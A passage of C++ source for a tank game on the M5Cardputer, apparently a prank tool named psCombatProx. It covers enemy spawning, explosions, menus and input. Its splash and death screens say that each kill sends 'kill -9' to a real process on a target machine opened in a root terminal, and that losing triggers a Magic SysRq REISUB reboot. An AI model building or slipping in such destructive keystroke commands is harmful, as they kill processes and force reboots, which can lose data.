                case ET_HEAVY:  ec = C_HEAVY;  break;
                case ET_SNIPER: ec = C_SNIPER; break;
                default:        ec = C_ENEMY;  break;
            }
        }
        _drawTank(_enemies[e], ec);
    }
    for (int i = 0; i < MAX_BULLETS; i++) _drawBullet(_bullets[i]);
    if (_exploding) _drawExplosion();
    _drawHUD();
}

void AppCombatProx::_drawExplosion() {
    static constexpr unsigned long EXPLODE_MS = 600;
    unsigned long age = millis() - _explodeStart;
    if (age >= EXPLODE_MS) { _exploding = false; return; }
    float t   = (float)age / EXPLODE_MS;
    int   r   = (int)(t * 24.f);
    uint16_t col = (t < 0.3f) ? 0xFFE0 : (t < 0.6f ? 0xFC00 : 0x8400);
    auto& d = M5Cardputer.Display;
    // Expanding ring + random sparks
    d.drawCircle(_explodeX, _explodeY, r,     col);
    d.drawCircle(_explodeX, _explodeY, r/2,   col);
    for (int sp = 0; sp < 6; sp++) {
        float a = (float)sp * (float)M_PI / 3.f + t * (float)M_PI;
        int sx = _explodeX + (int)(cosf(a) * r * 1.2f);
        int sy = _explodeY + (int)(sinf(a) * r * 1.2f);
        if (sx >= 0 && sx < AW && sy >= 0 && sy < PLAY_H)
            d.fillCircle(sx, sy, 2, col);
    }
}

void AppCombatProx::_spawnReinforcements() {
    int count = 2 + (int)(esp_random() % 4);  // 2..5
    int slot = ARENA_ENEMY_COUNT;
    const uint8_t biases[5]  = { 10, 15, 20, 25, 30 };
    const uint8_t roles[5]   = { 0, 1, 2, 3, 1 };
    // Reinforce type pool scales with round
    const uint8_t typePool[4][5] = {
        { ET_STANDARD, ET_STANDARD, ET_STANDARD, ET_STANDARD, ET_STANDARD },
        { ET_SCOUT,    ET_STANDARD, ET_STANDARD, ET_SCOUT,    ET_STANDARD },
        { ET_SCOUT,    ET_HEAVY,    ET_STANDARD, ET_SNIPER,   ET_SCOUT    },
        { ET_SCOUT,    ET_HEAVY,    ET_SNIPER,   ET_HEAVY,    ET_SNIPER   },
    };
    int ri = (_round - 1) < 4 ? (_round - 1) : 3;
    const int HP_FOR_TYPE[4] = { 1, 1, 3, 1 };

    int spawned = 0;
    for (int i = 0; i < count && slot < ENEMY_COUNT - 1; i++, slot++) {
        // Spawn 2 cells inset from each edge so _circleWall check passes
        static constexpr int INSET = CELL * 2 + TANK_R;
        float sx, sy;
        int edge = esp_random() % 4;
        if (edge == 0)      { sx = (float)(INSET + esp_random() % (VAW - INSET*2));    sy = (float)INSET; }
        else if (edge == 1) { sx = (float)(INSET + esp_random() % (VAW - INSET*2));    sy = (float)(VPLAY_H - INSET); }
        else if (edge == 2) { sx = (float)INSET;                                        sy = (float)(INSET + esp_random() % (VPLAY_H - INSET*2)); }
        else                { sx = (float)(VAW - INSET);                               sy = (float)(INSET + esp_random() % (VPLAY_H - INSET*2)); }

        if (sx > _camX && sx < _camX + AW)
            sx = (esp_random()&1) ? (float)(_camX - TANK_R*3) : (float)(_camX + AW + TANK_R*3);
        if (sy > _camY && sy < _camY + PLAY_H)
            sy = (esp_random()&1) ? (float)(_camY - TANK_R*3) : (float)(_camY + PLAY_H + TANK_R*3);

        sx = fclamp(sx, (float)(CELL + TANK_R), (float)(VAW - CELL - TANK_R));
        sy = fclamp(sy, (float)(CELL + TANK_R), (float)(VPLAY_H - CELL - TANK_R));

        if (!_circleWall(sx, sy, TANK_R + 2)) {
            uint8_t t = typePool[ri][i % 5];
            _enemies[slot] = {};
            _enemies[slot].x          = sx;
            _enemies[slot].y          = sy;
            _enemies[slot].angle      = atan2f(_player.y - sy, _player.x - sx);
            _enemies[slot].hp         = HP_FOR_TYPE[t];
            _enemies[slot].aiState    = 1;
            _enemies[slot].wanderBias = biases[i % 5];
            _enemies[slot].role       = roles[i % 5];
            _enemies[slot].type       = t;
            spawned++;
        }
    }
    if (spawned > 0) {
        _notifyMsg = "Reinforcements Deployed!";
        _notifyEnd = millis() + 2500;
    }
}

void AppCombatProx::_spawnKamikaze() {
    int slot = ENEMY_COUNT - 1;

    // Find the open cell furthest from the player
    int pc = (int)(_player.x / CELL);
    int pr = (int)(_player.y / CELL);
    int bestC = -1, bestR = -1;
    int bestDist2 = -1;

    for (int r = 1; r < ROWS-1; r++) {
        for (int c = 1; c < COLS-1; c++) {
            if (_wallMap[r][c]) continue;
            int dc = c - pc, dr = r - pr;
            int d2 = dc*dc + dr*dr;
            if (d2 > bestDist2) { bestDist2 = d2; bestC = c; bestR = r; }
        }
    }

    float sx, sy;
    if (bestC >= 0) {
        sx = bestC * CELL + CELL * 0.5f;
        sy = bestR * CELL + CELL * 0.5f;
    } else {
        // Absolute fallback: opposite corner
        sx = (_player.x < VAW / 2) ? (float)(VAW - TANK_R*2) : (float)(TANK_R*2);
        sy = (_player.y < VPLAY_H / 2) ? (float)(VPLAY_H - TANK_R*2) : (float)(TANK_R*2);
    }

    _enemies[slot] = {};
    _enemies[slot].x       = sx;
    _enemies[slot].y       = sy;
    _enemies[slot].angle   = atan2f(_player.y - sy, _player.x - sx);
    _enemies[slot].hp      = KAMIKAZE_HP;
    _enemies[slot].aiState = 99;
    _kamikazeIdx           = slot;

    _notifyMsg = "Kamikaze Inbound!";
    _notifyEnd = millis() + 2500;
}

void AppCombatProx::_drawPreview() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(C_BG);
    const CombatArena& arena = ARENAS[_arenaIdx];

    // Minimap: 480x240 virtual → 240x120 display (0.5x scale)
    // Each CELL (12px) → 6px tile; top margin 7px to centre vertically
    static constexpr int MSCALE = 6;
    static constexpr int MY_OFF = 7;

    d.fillRect(0, MY_OFF, 240, ROWS * MSCALE, 0x1082);
    for (int row = 0; row < ROWS; row++)
        for (int col = 0; col < COLS; col++)
            if (arena.walls[row][col])
                d.fillRect(col*MSCALE, MY_OFF + row*MSCALE, MSCALE, MSCALE, C_WALL);

    // Player spawn — green 4×4
    d.fillRect((int)(arena.playerX*0.5f)-2, MY_OFF+(int)(arena.playerY*0.5f)-2, 4, 4, C_PLAYER);

    // Enemy spawns — red 3×3
    for (int i = 0; i < ARENA_ENEMY_COUNT; i++)
        d.fillRect((int)(arena.enemyX[i]*0.5f)-1, MY_OFF+(int)(arena.enemyY[i]*0.5f)-1, 3, 3, C_ENEMY);

    // Arena name centred at top
    d.setTextSize(1);
    d.setTextColor(0xFFE0, C_BG);
    d.drawString(arena.name, AW/2 - d.textWidth(arena.name)/2, 1);

    // Countdown
    static constexpr unsigned long PREVIEW_MS = 7000;
    unsigned long elapsed = millis() - _phaseEnter;
    int secsLeft = (int)((PREVIEW_MS - elapsed) / 1000) + 1;
    if (secsLeft < 1) secsLeft = 1;
    char buf[32];
    snprintf(buf, sizeof(buf), "GET READY  %d...  ENTER to skip", secsLeft);
    d.setTextColor(0xFFFF, C_BG);
    int botY = AH - 22;  // fixed position leaving room for bar
    d.drawString(buf, AW/2 - d.textWidth(buf)/2, botY);

    // Progress bar
    int barW = (int)((float)(PREVIEW_MS - min(elapsed, PREVIEW_MS)) / PREVIEW_MS * AW);
    d.fillRect(0, AH-8, AW-barW, 8, 0x2104);
    if (barW > 0) d.fillRect(AW-barW, AH-8, barW, 8, 0x07E0);
}

void AppCombatProx::_drawSplash() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextColor(0xF800, 0x0000); d.setTextSize(2);
    d.drawString("COMBAT", AW/2 - d.textWidth("COMBAT")/2, 12);
    d.setTextSize(1); d.setTextColor(0xFFFF, 0x0000);
    d.drawString("psCombatProx", AW/2 - d.textWidth("psCombatProx")/2, 36);
    d.setTextColor(0xFFE0, 0x0000);
    d.drawString("!! Open a ROOT terminal on target !!", AW/2 - d.textWidth("!! Open a ROOT terminal on target !!")/2, 50);
    d.setTextColor(0x07E0, 0x0000);
    d.drawString("Kill enemy -> kill -9 <real pid>", AW/2 - d.textWidth("Kill enemy -> kill -9 <real pid>")/2, 64);
    d.setTextColor(0xF800, 0x0000);
    d.drawString("You die   -> Magic SysRq REISUB!", AW/2 - d.textWidth("You die   -> Magic SysRq REISUB!")/2, 76);
    d.setTextColor(0x8410, 0x0000);
    d.drawString("up=fwd  dn=back  left=rot-CCW  right=rot-CW", AW/2 - d.textWidth("up=fwd  dn=back  left=rot-CCW  right=rot-CW")/2, 90);
    d.drawString("fn / ENTER / BtnA = fire      ESC = quit", AW/2 - d.textWidth("fn / ENTER / BtnA = fire      ESC = quit")/2, 102);
    d.setTextColor(0xFFFF, 0x0000);
    d.drawString("Press ENTER to start", AW/2 - d.textWidth("Press ENTER to start")/2, 118);
}

void AppCombatProx::_drawDead() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(2); d.setTextColor(0xF800, 0x0000);
    d.drawString("TANK DESTROYED", AW/2 - d.textWidth("TANK DESTROYED")/2, 14);
    d.setTextSize(1); d.setTextColor(0xFFFF, 0x0000);
    if (_reisub) {
        d.drawString("Magic SysRq REISUB sent!", AW/2 - d.textWidth("Magic SysRq REISUB sent!")/2, 42);
        d.setTextColor(0xFC00, 0x0000);
        d.drawString("R-E-I-S-U-B  System going down...", AW/2 - d.textWidth("R-E-I-S-U-B  System going down...")/2, 54);
    } else {
        d.setTextColor(0xF800, 0x0000);
        d.drawString("REISUB disabled (safe mode)", AW/2 - d.textWidth("REISUB disabled (safe mode)")/2, 50);
    }
    d.setTextColor(0xFFE0, 0x0000);
    String rnd = "Survived " + String(_round - 1) + " round(s)";
    d.drawString(rnd, AW/2 - d.textWidth(rnd)/2, 72);
    d.setTextColor(0x8410, 0x0000);
    String sc = "Final score: " + String(_score);
    d.drawString(sc, AW/2 - d.textWidth(sc)/2, 86);
    d.setTextColor(0xFFFF, 0x0000);
    d.drawString("ENTER=retry   ESC=quit", AW/2 - d.textWidth("ENTER=retry   ESC=quit")/2, 118);
}

void AppCombatProx::_drawRoundClear() {
    auto& d = M5Cardputer.Display;
    d.fillScreen(0x0000);
    d.setTextSize(2); d.setTextColor(0x07E0, 0x0000);
    char buf[24];
    snprintf(buf, sizeof(buf), "ROUND %d", _round);
    d.drawString(buf, AW/2 - d.textWidth(buf)/2, 16);
    d.setTextSize(1); d.setTextColor(0xFFE0, 0x0000);
    d.drawString("CLEARED!", AW/2 - d.textWidth("CLEARED!")/2, 42);
    d.setTextColor(0xFFFF, 0x0000);
    String sc = "Score: " + String(_score);
    d.drawString(sc, AW/2 - d.textWidth(sc)/2, 58);
    d.setTextColor(0x8410, 0x0000);
    snprintf(buf, sizeof(buf), "Round %d incoming...", _round + 1);
    d.drawString(buf, AW/2 - d.textWidth(buf)/2, 78);

    // Legend: enemy type colours
    d.setTextColor(C_ENEMY,   0x0000); d.drawString("Standard", 6,  98);
    d.setTextColor(C_SCOUT,   0x0000); d.drawString("Scout",    6,  108);
    d.setTextColor(C_HEAVY,   0x0000); d.drawString("Heavy",    80, 98);
    d.setTextColor(C_SNIPER,  0x0000); d.drawString("Sniper",   80, 108);

    d.setTextColor(0xFFFF, 0x0000);
    d.drawString("ENTER=next round  ESC=quit", AW/2 - d.textWidth("ENTER=next round  ESC=quit")/2, 120);

    static constexpr unsigned long CLEAR_MS = 5000;
    unsigned long elapsed = millis() - _phaseEnter;
    int barW = (int)((float)(CLEAR_MS - min(elapsed, CLEAR_MS)) / CLEAR_MS * AW);
    d.fillRect(0, AH-8, AW-barW, 8, 0x2104);
    if (barW > 0) d.fillRect(AW-barW, AH-8, barW, 8, 0x07E0);
}

// ---- Main update ----

void AppCombatProx::onUpdate() {
    if (_phase == PH_SPLASH) {
        if (_needsRedraw) { _drawSplash(); _needsRedraw = false; }
        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();
        if (ki.esc)        { uiManager.returnToLauncher(); return; }
        if (ki.ch == 'd')  { _reisub = !_reisub; _needsRedraw = true; return; }
        if (ki.enter)      { _resetGame(); _phase = PH_PREVIEW; _phaseEnter = millis(); _needsRedraw = true; }
        return;
    }

    if (_phase == PH_DEAD) {
        if (_needsRedraw) {
            _drawDead();
            _needsRedraw = false;
            if (_pendingReisub) { _onPlayerDied(); _pendingReisub = false; }
        }
        KeyInput ki = pollKeys();
        if (!ki.anyKey) return;
        uiManager.notifyInteraction();
        if (ki.esc)   { _phase = PH_SPLASH; _needsRedraw = true; return; }
        if (ki.enter) { _resetGame(); _phase = PH_PREVIEW; _phaseEnter = millis(); _needsRedraw = true; }
        return;
    }

    if (_phase == PH_ROUND_CLEAR) {
        static constexpr unsigned long CLEAR_MS = 5000;
        unsigned long elapsed = millis() - _phaseEnter;
        // Redraw every second for the countdown bar
        int secsNow = (int)((CLEAR_MS - min(elapsed, CLEAR_MS)) / 1000);
        if (_needsRedraw || secsNow != _previewLastSec) {
            _previewLastSec = secsNow;
            _drawRoundClear();
            _needsRedraw = false;
        }
        KeyInput ki = pollKeys();
        if (ki.esc)   { _phase = PH_SPLASH; _needsRedraw = true; return; }
        if (ki.enter || ki.fn || elapsed >= CLEAR_MS) {
            _round++;
            _startNextRound();
            _phase = PH_PREVIEW; _phaseEnter = millis(); _needsRedraw = true;
        }
        return;
    }

    if (_phase == PH_PREVIEW) {
        static constexpr unsigned long PREVIEW_MS = 7000;

        unsigned long elapsed = millis() - _phaseEnter;

        // Only redraw once per second (when the countdown digit changes) to avoid flicker
        int secsNow = (int)((PREVIEW_MS - min(elapsed, PREVIEW_MS)) / 1000);
        if (_needsRedraw || secsNow != _previewLastSec) {
            _previewLastSec = secsNow;
            _drawPreview();
            _needsRedraw = false;
        }

        KeyInput ki = pollKeys();
        if (ki.esc)            { _phase = PH_SPLASH; _needsRedraw = true; return; }
        if (ki.enter || ki.fn) { _phase = PH_PLAYING; _needsRedraw = true; return; }
        if (elapsed >= PREVIEW_MS) {
            _phase = PH_PLAYING; _needsRedraw = true;
        }
        return;
    }

    // PH_PLAYING
    uiManager.notifyInteraction();
    M5Cardputer.update();
    unsigned long now = millis();

    if (M5Cardputer.Keyboard.isPressed()) {
        auto ks = M5Cardputer.Keyboard.keysState();

        // ESC / quit
        for (uint8_t hk : ks.hid_keys)
            if (hk == 0x29) { _phase = PH_SPLASH; _needsRedraw = true; return; }
        for (char c : ks.word)
            if (c == 0x1B) { _phase = PH_SPLASH; _needsRedraw = true; return; }

        // Movement & rotation via word characters
        for (char c : ks.word) {
            if (c == ',') _player.angle = wrapAngle(_player.angle - ROTATE_SPEED);
            if (c == '/') _player.angle = wrapAngle(_player.angle + ROTATE_SPEED);
            if (c == ';') {
                float nx = _player.x + cosf(_player.angle) * SPEED;
                float ny = _player.y + sinf(_player.angle) * SPEED;
                if (!_circleWall(nx, ny, TANK_R)) {
                    _player.x = fclamp(nx, TANK_R, VAW - TANK_R);
                    _player.y = fclamp(ny, TANK_R, VPLAY_H - TANK_R);
                }
            }
            if (c == '.') {
                float nx = _player.x - cosf(_player.angle) * SPEED;
                float ny = _player.y - sinf(_player.angle) * SPEED;
                if (!_circleWall(nx, ny, TANK_R)) {
                    _player.x = fclamp(nx, TANK_R, VAW - TANK_R);
                    _player.y = fclamp(ny, TANK_R, VPLAY_H - TANK_R);
                }
            }
        }

        // HID arrow keys
        for (uint8_t hk : ks.hid_keys) {
            if (hk == 0x52) { // UP arrow
                float nx = _player.x + cosf(_player.angle) * SPEED;
                float ny = _player.y + sinf(_player.angle) * SPEED;
                if (!_circleWall(nx, ny, TANK_R)) {
                    _player.x = fclamp(nx, TANK_R, VAW - TANK_R);
                    _player.y = fclamp(ny, TANK_R, VPLAY_H - TANK_R);
                }
            }
            if (hk == 0x51) { // DOWN arrow
                float nx = _player.x - cosf(_player.angle) * SPEED;
                float ny = _player.y - sinf(_player.angle) * SPEED;
                if (!_circleWall(nx, ny, TANK_R)) {
                    _player.x = fclamp(nx, TANK_R, VAW - TANK_R);
                    _player.y = fclamp(ny, TANK_R, VPLAY_H - TANK_R);
                }
            }
            if (hk == 0x50) _player.angle = wrapAngle(_player.angle - ROTATE_SPEED); // LEFT
            if (hk == 0x4F) _player.angle = wrapAngle(_player.angle + ROTATE_SPEED); // RIGHT
        }

        if ((ks.fn || ks.enter) && now - _player.lastShot > FIRE_COOLDOWN)
            _fireBullet(_player, true);
    }

    if (M5Cardputer.BtnA.wasPressed() && now - _player.lastShot > FIRE_COOLDOWN)
        _fireBullet(_player, true);

    _update(now);
    _drawArena();
}

} // namespace Cardputer
#endif
